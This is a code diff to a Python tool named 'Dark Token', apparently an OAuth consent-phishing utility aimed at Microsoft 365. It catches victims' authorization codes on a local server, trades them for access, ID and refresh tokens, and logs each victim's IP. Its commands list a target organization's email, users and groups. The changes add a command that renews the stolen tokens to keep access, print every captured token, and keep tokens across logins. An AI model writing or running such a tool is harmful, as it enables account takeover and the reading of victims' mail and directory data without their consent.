@@ -73,8 +73,9 @@ help = """
 
 start server         - To start Dark Token server.
 stop server          - To stop Dark Token server.
+renew tokens         - To renew all tokens.
 list tokens          - To list all tokens.
-list messages ID      - To list email messages from a specific account.
+list messages ID     - To list email messages from a specific account.
 list users ID        - To list users of the target organization.
 list groups ID       - To list groups of the target organization.
 list my groups ID    - To list assigned groups of the current account.
@@ -127,6 +128,8 @@ class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_GET(self):
 		url_params = urlparse(self.path).query
 		if url_params:
+			if not DEBUG['debug'] == 0:
+				print url_params
 			auth_code = parse_qs(url_params)['code'][0]
 			if auth_code:
 				global CLIENT_IP
@@ -178,6 +181,23 @@ def get_access_token(code):
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
 
+	account = get_account_profile(res_json['access_token'])
+	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
+
+def refresh_access_token(refresh_token):
+	payload = {
+		'grant_type': 'refresh_token',
+ 		'client_id': APP_CONFIG['client_id'],
+		'client_secret': APP_CONFIG['client_secret'],
+		'refresh_token': refresh_token
+		}
+
+	payload.update(APP_CONFIG)
+	resp = httpRequest('https://login.windows.net/common/oauth2/v2.0/token', payload)
+	resp_body = resp.read()
+	if not DEBUG['debug'] == 0:
+		print resp_body
+	res_json = json.loads(resp_body.decode('utf-8'))
 	account = get_account_profile(res_json['access_token'])
 	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
 
@@ -250,8 +270,8 @@ def stop_server():
 		pass
 
 def store_token(account, access_token, id_token, refresh_token):
-	global TOKENS
-	TOKENS = []
+	#global TOKENS
+	#TOKENS = []
 	TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])
 
 print '[+] Starting Dark Token...'
@@ -262,6 +282,15 @@ while True:
 		thread.start_new_thread(start_server, ())
 	elif SIGNAL.__contains__('stop server'):
 		stop_server()
+	elif SIGNAL.__contains__('renew tokens'):
+		print '[+] Trying To Renw Available Tokens:'
+		try:
+			for i in range(len(TOKENS)):
+				refresh_access_token(TOKENS[i-1][3])
+			pass
+		except NameError:
+			print '[!] 0 tokens found in the database.'
+			pass
 	elif SIGNAL.__contains__('list tokens'):
 		print '[+] Listing Available Tokens:'
 		try:
@@ -269,11 +298,9 @@ while True:
 				print colors.allwhite + '-' * int(columns) + colors.end
 				#print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]['userPrincipalName']
 				print 'ID = [%i] - Account: %s' % (i, TOKENS[i][0])
-				#print 'Access_Token: ' + TOKENS[i-1][1]
 				print 'Access_Token: %s' % TOKENS[i-1][1]
-				#print 'Refresh_Token: ' + TOKENS[i-1][3]
+				print 'ID_Token: %s' % TOKENS[i-1][2]
 				print 'Refresh_Token: %s' % TOKENS[i-1][3]
-				#print 'Client IP: ' + TOKENS[i-1][4]
 				print 'Client IP: %s' % TOKENS[i-1][4]
 		except NameError:
 			print '[!] 0 tokens found in the database.'
